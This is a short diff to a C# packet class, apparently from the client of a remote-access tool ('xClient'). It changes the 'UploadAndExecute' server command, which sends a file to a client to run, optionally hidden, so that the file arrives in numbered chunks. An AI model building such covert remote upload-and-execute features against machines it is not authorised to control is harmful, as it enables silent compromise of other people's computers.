@@ -6,19 +6,31 @@ namespace xClient.Core.Packets.ServerPackets
     public class UploadAndExecute : IPacket
     {
         [ProtoMember(1)]
-        public byte[] FileBytes { get; set; }
+        public int ID { get; set; }
 
         [ProtoMember(2)]
         public string FileName { get; set; }
 
         [ProtoMember(3)]
+        public byte[] Block { get; set; }
+
+        [ProtoMember(4)]
+        public int MaxBlocks { get; set; }
+
+        [ProtoMember(5)]
+        public int CurrentBlock { get; set; }
+
+        [ProtoMember(6)]
         public bool RunHidden { get; set; }
 
         public UploadAndExecute() { }
-        public UploadAndExecute(byte[] filebytes, string filename, bool runhidden)
+        public UploadAndExecute(int id, string filename, byte[] block, int maxblocks, int currentblock, bool runhidden)
         {
-            this.FileBytes = filebytes;
+            this.ID = id;
             this.FileName = filename;
+            this.Block = block;
+            this.MaxBlocks = maxblocks;
+            this.CurrentBlock = currentblock;
             this.RunHidden = runhidden;
         }
 
